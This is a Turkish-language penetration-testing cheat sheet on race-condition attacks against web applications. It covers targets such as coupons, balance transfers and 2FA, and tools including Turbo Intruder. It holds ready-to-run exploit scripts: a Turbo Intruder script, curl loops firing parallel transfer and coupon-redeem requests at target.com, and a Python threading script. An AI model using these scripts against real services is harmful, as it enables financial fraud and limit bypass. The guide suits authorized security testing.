[🇬🇧 English](../../README.md)

# ⚡ Yarış Durumları (Race Conditions) Başvuru Kılavuzu

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

## 🎯 Yarış Durumu (Race Condition) Nedir?

**Yarış Durumu (Race Condition)**, işlemlerin yürütülme zamanlaması ve sırası arasındaki küçük zaman farklarının (özellikle kontrol etme ile kullanma arasındaki aralık / check-then-use) istismar edilerek uygulamanın beklenmeyen durumlara düşürülmesidir.

### Etkileri
- 💰 **Finansal Dolandırıcılık** - Bakiye yetersiz kalmadan önce birden fazla harcama yapma
- 🎫 **Kupon Kötüye Kullanımı** - Tek kullanımlık indirim kodunu aynı anda birden fazla kez kullanma
- 👤 **Yetki Yükseltme (Privilege Escalation)** - Yetki kontrolleri tamamlanmadan araya girme
- 📂 **Dosya Üzerine Yazma (File Overwrite)** - TOCTOU (Time-of-check to time-of-use) zafiyetleri

---

## 🔍 Yaygın Hedefler

```
- İndirim kuponu / promosyon kodu kullanımları
- Oylama / beğeni sistemleri
- Para ve bakiye transfer işlemleri
- Limit tabanlı işlemler (günlük indirme hakkı vb.)
- Dosya yükleme mekanizmaları
- Parola sıfırlama akışları
- İki faktörlü kimlik doğrulama (2FA) doğrulamaları
- Hesap kayıt süreçleri
```

---

## 💉 İstismar Teknikleri

### Burp Suite Turbo Intruder

```python
# İsteği aynı anda ve çok yüksek hızda eşzamanlı gönderme
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater (Manuel Paralel Gönderim)
```
1. İsteği Repeater sekmesine gönderin
2. Sekmeyi 20+ kez çoğaltın (Duplicate tab)
3. Sekmeleri bir sekme grubunda (Tab group) toplayın
4. "Send group (parallel)" seçeneğine tıklayın
```

### curl ile Paralel İstek
```bash
# 20 paralel istek gönderme
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# POST verisi ile paralel gönderim
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Python Threading ile İstismar
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Hepsini aynı anda başlatın
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 Yaygın Senaryolar

### Kupon Kodu Yarışı
```
1. Kupon = %50 indirim sağlar
2. Normal işleyiş: Yalnızca bir kez kullanılabilir
3. Yarış atağı: Aynı anda 10 istek eşzamanlı gönderilir
4. Sonuç: Kupon tekil olarak işaretlenmeden 10 siparişte de %50 indirim uygulanır
```

### Limit Aşma Yarışı
```
1. Limit: Günde en fazla 3 dosya indirme hakkı
2. Yarış atağı: Aynı anda 10 indirme isteği gönderilir
3. Kontrol anı eşzamanlı gerçekleşir
4. Sonuç: Limit devreye girmeden önce 10 isteğin tamamı başarılı olur
```

### Dosya Yükleme Yarışı (TOCTOU)
```
1. Dosya geçici dizine yüklenir → antivirüs veya güvenlik kontrolünden geçirilir
2. Dosya taşınmadan hemen önceki milisaniyede zararlı dosya ile değiştirilir
3. Sunucu kontrol edilmiş varsayarak zararlı dosyayı hedef dizine taşır
```

---

## 🛠️ Araçlar

| Araç | Amaç |
|------|------|
| **Turbo Intruder** | Paralel istekler için Burp Suite eklentisi |
| **race-the-web** | Go diliyle yazılmış yarış durumu test aracı |
| **racepwn** | Python tabanlı yarış durumu istismar aracı |

---

## 📚 Kaynaklar

- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Zamanlamayı İstismar Edin!</b><br>
  <i>Yalnızca yetkili ve yasal testler içindir!</i>
</p>
